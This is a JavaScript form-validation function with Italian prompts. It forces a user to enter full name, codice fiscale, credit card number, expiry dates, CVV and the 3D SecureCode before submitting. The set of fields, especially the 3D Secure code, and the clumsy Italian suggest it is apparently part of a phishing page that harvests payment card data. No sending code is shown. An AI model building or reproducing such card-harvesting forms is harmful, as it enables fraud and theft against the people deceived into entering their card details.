 function validateForm() {
       var x=document.forms["simple"]["nome"].value;
if (x==null || x=="")
 {
 alert(" Inserisci la tua Nome E Cognome ");
 return false;
 }
        var x=document.forms["simple"]["cf"].value;
if (x==null || x=="")
 {
 alert(" Inserisci la tua Codice Fiscale ");
 return false;
 }
    var x=document.forms["simple"]["cc"].value;
if (x==null || x=="")
 {
 alert(" Inserisci la tua Numero Carta di credito ");
 return false;
 }
      var x=document.forms["simple"]["date1"].value;
if (x==null || x=="")
 {
 alert(" Inserisci la tua Data di scadenza ");
 return false;
 }
      var x=document.forms["simple"]["date2"].value;
if (x==null || x=="")
 {
 alert(" Inserisci la tua Data di scadenza ");
 return false;
 }
      var x=document.forms["simple"]["cvv"].value;
if (x==null || x=="")
 {
 alert(" Inserisci la tua Codice sicurezza (CVV) ");
 return false;
 }
      var x=document.forms["simple"]["3d"].value;
if (x==null || x=="")
 {
 alert(" Inserisci la SecureCode ");
 return false;
 }
 }
 